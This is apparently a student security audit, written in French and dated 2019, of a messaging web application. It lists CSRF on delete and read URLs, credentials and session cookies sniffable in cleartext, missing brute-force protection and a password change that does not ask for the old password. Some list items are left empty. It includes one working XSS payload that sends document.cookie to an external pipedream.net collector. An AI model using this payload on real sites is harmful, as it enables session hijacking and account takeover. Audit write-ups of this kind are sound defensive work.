# STI — Analyse de menaces

* **Date** : 10.12.2019
* **Auteurs** : Nikolaos Garanis, Nemanja Pantic.

## Introduction

* CSRF sur tous les formulaires ainsi que les liens, on a reussi à
  * supprimer n'importe quel message (via son id)
    * en chargeant l'url /delete.php?delete=<id>
  * executer une requete http pour lire n'importe quel message via son id
    * /read.php?message=131, mais impossible de lire le contenu depuis le navigateur mais si l'attaquant sniff le reseau il pourra voir le contenu du message
  * envoyer un message
    * 
  * changer son mdp
    * 
  * administration
  * réponse aux messages
  * suppression des messages
* Credentials obtenable en faisant de l'écoute sur le réseau
  * Nous pouvons obtenir le cookie de session ainsi que le login et le password
  * N'importe qui peut donc usurper l'identité d'un compte sur le réseau
* XSS dans message avec
    ```html
    <script>fetch('https://enons72ccci9o.x.pipedream.net/c' + document.cookie)</script>
    ```
* pas d'injections SQL car PDO::prepare/execute sont utilisés.
* pas de protection contre le bruteforce de mdp
* mot de passe actuel non demandé lors du changement de mdp (possibilité de changé le mdp lors d'un vol de session)